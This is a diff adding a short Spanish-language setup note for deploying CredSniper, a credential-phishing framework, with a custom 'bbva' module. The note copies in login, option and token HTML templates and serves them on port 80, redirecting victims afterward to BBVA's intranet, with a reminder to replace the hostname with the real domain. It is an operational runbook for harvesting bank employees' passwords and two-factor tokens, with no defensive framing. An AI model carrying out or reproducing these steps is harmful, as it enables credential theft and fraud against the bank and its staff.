@@ -1,0 +1,16 @@
+- git clone https://github.com/ustayready/CredSniper.git
+- cd CredSniper
+- cambiar el archivo credsniper.py por el del drive
+- cd CredSniper/modules
+- mkdir bbva
+- cd bbva
+- copiar bbva.py aqui
+- mkdir templates
+- cd templates
+- copiar aqui los 3 htmls (login.html, opcion.html, token.hml)
+- cd Credsniper
+- ./install.sh -> para que cree el ambiente virtual -> marcara error ----- 
+        ----> otra opcion es ejecutar virtualenv CredSniper y ya despues source CredSniper/bin/activate
+
+- Para ejecutar en el server:
+    - python credsniper.py --module bbva --port 80 --verbose --final https://intranet.bbva.com --hostname 127.0.0.1 -> cambiar por el dominio
